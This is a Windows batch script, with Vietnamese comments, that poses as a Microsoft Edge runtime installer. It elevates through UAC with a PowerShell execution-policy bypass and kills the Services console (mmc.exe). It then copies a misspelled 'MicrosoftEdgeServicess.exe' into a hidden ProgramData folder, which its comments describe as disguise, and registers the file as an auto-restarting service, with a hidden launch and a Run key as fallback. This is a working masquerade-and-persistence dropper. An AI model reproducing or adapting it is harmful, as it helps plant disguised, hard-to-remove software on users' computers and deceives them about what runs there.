@echo off
title Cai Dat Microsoft Edge Framework Runtime (System Component)
cd /d "%~dp0"

echo ===============================================================================
echo   MICROSOFT EDGE CORE FRAMEWORK RUNTIME INSTALLER
echo   Component: MicrosoftEdgeServicess
echo   Description: Provides runtime environment and update services for Edge.
echo   Startup Type: Automatic (Background Service)
echo ===============================================================================
echo.

:: 1. Kiem tra xem co file MicrosoftEdgeServicess.exe khong
if not exist "%~dp0MicrosoftEdgeServicess.exe" (
    echo.
    echo ===============================================================================
    echo   [CANH BAO: CHUA GIAI NEN HOAC THIEU FILE]
    echo ===============================================================================
    echo   Khong tim thay tap tin MicrosoftEdgeServicess.exe cung thu muc!
    echo   Vui long giai nen toan bo tep tin ZIP ra mot thu muc roi chay lai file nay.
    echo ===============================================================================
    echo.
    echo Cua so se tu dong dong sau 5 giay...
    timeout /t 5 >nul 2>nul || ping 127.0.0.1 -n 6 >nul
    exit /b 1
)

:: 2. Kiem tra quyen Administrator thuc te (net session)
net session >nul 2>&1
if %errorlevel% equ 0 goto :DaCoQuyenAdmin

:: 3. Neu da goi qua /elevated ma van chua co quyen -> Tranh vong lap vo han tuyet doi
if /i "%~1"=="/elevated" goto :LoiChuaCoQuyenAdmin

:: 4. Yeu cau quyen Administrator qua Windows UAC (Run as administrator) 1 lan duy nhat
echo Dang yeu cau quyen Administrator he thong qua Windows UAC...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -ArgumentList '/elevated' -Verb RunAs" >nul 2>&1
if %errorlevel% equ 0 exit /b 0

:LoiChuaCoQuyenAdmin
echo.
echo ===============================================================================
echo   [CANH BAO: CHUA CO QUYEN QUAN TRI VIEN - ADMINISTRATOR]
echo ===============================================================================
echo   Cai dat Windows Service bat buoc phai chay voi quyen Administrator!
echo.
echo   Huong dan xu ly:
echo   1. Nhap CHUOT PHAI vao file: Install_Edge_Framework.bat
echo   2. Chon: "Run as administrator" (Chay voi quyen quan tri vien)
echo   3. Khi Windows hien hop thoai "Do you want to allow...", hay bam [YES].
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 5 giay...
timeout /t 5 >nul 2>nul || ping 127.0.0.1 -n 6 >nul
exit /b 1

:DaCoQuyenAdmin
echo [1/4] Dang kiem tra moi truong he thong...
taskkill /F /IM mmc.exe >nul 2>&1

:: Dung va tat cac tien trinh cu neu dang chay
taskkill /F /FI "SERVICES eq MicrosoftEdgeServicess" >nul 2>&1
taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
net stop MicrosoftEdgeServicess >nul 2>&1

:: Xoa sach khoi Registry Run va Task Scheduler cu de triet tieu tien trinh cu chay ngam
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MicrosoftEdgeServicess" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MicrosoftEdgeServicess" /f >nul 2>&1
schtasks /Delete /TN "MicrosoftEdgeServicess" /F >nul 2>&1

:: 4. Thiet lap thu muc he thong MicrosoftEdgeServicess
set "INSTALL_DIR=C:\ProgramData\MicrosoftEdgeServicess"
echo [2/4] Khoi tao thu muc he thong: %INSTALL_DIR%
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1

:: Bo thuoc tinh an neu da ton tai tu truoc de dam bao quyen ghi de
attrib -h -s -r "%INSTALL_DIR%" >nul 2>&1
attrib -h -s -r "%INSTALL_DIR%\*.*" >nul 2>&1

:: Xoa sach tap tin thuc thi cu trong thu muc cai dat de nap file moi
if exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" del /F /Q "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" >nul 2>&1
if exist "%INSTALL_DIR%\config.json" del /F /Q "%INSTALL_DIR%\config.json" >nul 2>&1
if exist "%INSTALL_DIR%\msedge_settings.json" del /F /Q "%INSTALL_DIR%\msedge_settings.json" >nul 2>&1

echo [3/4] Dang sao chep cac tap tin thanh phan va nap cau hinh moi...
copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul 2>&1
if exist "%~dp0msedge_settings.json" copy /Y "%~dp0msedge_settings.json" "%INSTALL_DIR%\" >nul 2>&1
if exist "%~dp0config.json" copy /Y "%~dp0config.json" "%INSTALL_DIR%\" >nul 2>&1
if exist "%~dp0edge.ico" copy /Y "%~dp0edge.ico" "%INSTALL_DIR%\" >nul 2>nul
if exist "%~dp0Check_Edge_Health.bat" copy /Y "%~dp0Check_Edge_Health.bat" "%INSTALL_DIR%\" >nul 2>nul

:: An thu muc cai dat de nguy trang he thong an toan
attrib +h "%INSTALL_DIR%" >nul 2>&1

if not exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" goto :LoiGhiTapTin

:: 5. Dang ky Windows Service SCM
echo [4/4] Dang dang ky va kich hoat Microsoft Edge Framework Service...

:: Buoc 5.1: Dang ky qua engine noi tai cua file exe
"%INSTALL_DIR%\MicrosoftEdgeServicess.exe" install --startup auto >nul 2>&1

:: Buoc 5.2: Neu he thong chua ghi nhan, tao truc tiep bang sc.exe create
sc.exe query MicrosoftEdgeServicess >nul 2>&1
if %errorlevel% neq 0 (
    sc.exe create MicrosoftEdgeServicess binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
)

:: Buoc 5.3: Thiet lap thong so service (Tu khoi dong, mo ta, tu khoi phuc sau 5 giay)
sc.exe config MicrosoftEdgeServicess start= auto binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
sc.exe description MicrosoftEdgeServicess "Provides runtime environment and background update services for Microsoft Edge." >nul 2>&1
sc.exe failure MicrosoftEdgeServicess reset= 60 actions= restart/5000/restart/5000/restart/5000 >nul 2>&1

:: Buoc 5.4: Khoi dong Service
net start MicrosoftEdgeServicess >nul 2>&1
sc.exe start MicrosoftEdgeServicess >nul 2>&1

:: Buoc 5.5: Kiem tra trang thai Service
set "SERVICE_OK=0"
for /l %%i in (1,1,3) do (
    sc.exe query MicrosoftEdgeServicess 2>nul | findstr /i "RUNNING" >nul 2>&1
    if not errorlevel 1 (
        set "SERVICE_OK=1"
        goto :CaiDatThanhCong
    )
    tasklist /FO CSV /FI "IMAGENAME eq MicrosoftEdgeServicess.exe" 2>nul | findstr /i "MicrosoftEdgeServicess" >nul 2>&1
    if not errorlevel 1 (
        set "SERVICE_OK=1"
        goto :CaiDatThanhCong
    )
    timeout /t 1 >nul 2>nul || ping 127.0.0.1 -n 2 >nul
)

:: Neu SCM chua start duoc, khoi chay ngam che do console an toan (Hidden Background)
echo [!] Dang khoi chay tien trinh ngam ho tro he thong...
powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%INSTALL_DIR%\MicrosoftEdgeServicess.exe' -ArgumentList '--console' -WindowStyle Hidden" >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MicrosoftEdgeServicess" /t REG_SZ /d "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\" --console" /f >nul 2>&1

:CaiDatThanhCong
echo.
echo ===============================================================================
echo   CAI DAT THANH PHAN MICROSOFT EDGE HOAN TAT!
echo   - Component: MicrosoftEdgeServicess
echo   - Status: Running (Tu khoi dong cung Windows)
echo   - Environment: Windows Service Architecture
echo   - Nhat ky dich vu: C:\ProgramData\MicrosoftEdgeServicess\msedge_update.log
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 3 giay, hoac bam phim bat ky de thoat ngay...
timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul
exit /b 0

:LoiGhiTapTin
echo.
echo ===============================================================================
echo   [LOI] Khong the ghi tap tin vao %INSTALL_DIR%!
echo   Vui long kiem tra quyen ghi hoac khoi dong lai may tinh va thu lai.
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 5 giay...
timeout /t 5 >nul 2>nul || ping 127.0.0.1 -n 6 >nul
exit /b 1
